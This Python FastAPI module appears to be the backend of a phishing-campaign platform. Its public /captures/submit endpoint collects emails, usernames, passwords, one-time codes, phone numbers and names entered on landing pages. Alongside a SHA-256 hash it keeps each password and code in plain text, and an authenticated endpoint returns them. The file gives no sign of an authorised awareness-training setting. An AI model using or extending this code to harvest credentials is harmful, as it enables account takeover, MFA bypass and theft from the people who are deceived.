import json
import hashlib
import uuid

from fastapi import APIRouter, Depends, HTTPException, Request, Form
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from typing import List, Optional
from pydantic import BaseModel

from database import get_db
from captures.models import Capture
from campaigns.models import Campaign
from landing_pages.models import LandingPage
from auth.utils import get_current_user
from auth.models import User

router = APIRouter(prefix="/captures", tags=["captures"])


class CaptureResponse(BaseModel):
    id: int
    campaign_id: Optional[int]
    page_id: Optional[int]
    page_name: Optional[str]
    ip: str
    email: Optional[str]
    password_captured: Optional[bool]
    submitted_at: str
    session_id: str
    user_agent: Optional[str]

    class Config:
        from_attributes = True


@router.post("/submit")
async def submit_capture(
    request: Request,
    email: str = Form(None),
    username: str = Form(None),
    password: str = Form(None),
    otp: str = Form(None),
    phone: str = Form(None),
    full_name: str = Form(None),
    password_entered: str = Form(None),
    page_id: int = Form(None),
    campaign_id: Optional[int] = Form(None),
    event: str = Form(None),
    db: AsyncSession = Depends(get_db),
):
    client_ip = request.client.host if request.client else "Unknown"
    user_agent = request.headers.get("user-agent", "")

    if password:
        hashed_pw = hashlib.sha256(password.encode()).hexdigest()
    elif password_entered == "true":
        hashed_pw = hashlib.sha256(b"password-entered").hexdigest()
    else:
        hashed_pw = None

    user_identifier = email or username or "Unknown"

    raw = {}
    for k, v in [
        ("email", email),
        ("username", username),
        ("password", password),
        ("otp", otp),
        ("phone", phone),
        ("full_name", full_name),
        ("password_entered", password_entered),
        ("event", event),
    ]:
        if v is not None and v != "":
            raw[k] = v
    # Also record the server-side observations so the dashboard can show them
    # without extra fetches.
    raw["ip"] = client_ip
    raw["user_agent"] = user_agent
    if page_id is not None:
        raw["page_id"] = page_id
    if campaign_id is not None:
        raw["campaign_id"] = campaign_id

    new_capture = Capture(
        campaign_id=campaign_id,
        page_id=page_id,
        ip=client_ip,
        user_agent=user_agent,
        email=user_identifier,
        password_hash=hashed_pw,
        session_id=str(uuid.uuid4()),
        raw_payload=json.dumps(raw, ensure_ascii=False),
    )

    db.add(new_capture)

    if campaign_id:
        result = await db.execute(select(Campaign).where(Campaign.id == campaign_id))
        campaign = result.scalars().first()
        if campaign:
            campaign.data_submitted += 1

    await db.commit()

    return {"status": "success"}


@router.get("/", response_model=List[CaptureResponse])
async def get_captures(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(
        select(Capture, LandingPage.name.label("page_name"))
        .outerjoin(LandingPage, Capture.page_id == LandingPage.id)
        .order_by(Capture.submitted_at.desc())
        .limit(200)
    )

    return [
        {
            "id": c.id,
            "campaign_id": c.campaign_id,
            "page_id": c.page_id,
            "page_name": page_name,
            "ip": c.ip,
            "email": c.email,
            "password_captured": c.password_hash is not None,
            "submitted_at": c.submitted_at.isoformat() if c.submitted_at else "",
            "session_id": c.session_id,
            "user_agent": c.user_agent,
        }
        for c, page_name in result.all()
    ]


@router.get("/{capture_id}")
async def get_capture(
    capture_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(
        select(Capture, LandingPage.name.label("page_name"))
        .outerjoin(LandingPage, Capture.page_id == LandingPage.id)
        .where(Capture.id == capture_id)
    )
    row = result.first()
    if not row:
        raise HTTPException(status_code=404, detail="Capture not found")

    c, page_name = row
    raw = {}
    if c.raw_payload:
        try:
            raw = json.loads(c.raw_payload)
        except Exception:
            raw = {}

    return {
        "id": c.id,
        "campaign_id": c.campaign_id,
        "page_id": c.page_id,
        "page_name": page_name,
        "ip": c.ip,
        "email": c.email,
        "password_captured": c.password_hash is not None,
        "password_hash": c.password_hash,
        "password": raw.get("password"),
        "submitted_at": c.submitted_at.isoformat() if c.submitted_at else "",
        "session_id": c.session_id,
        "user_agent": c.user_agent,
        "raw": raw,
    }
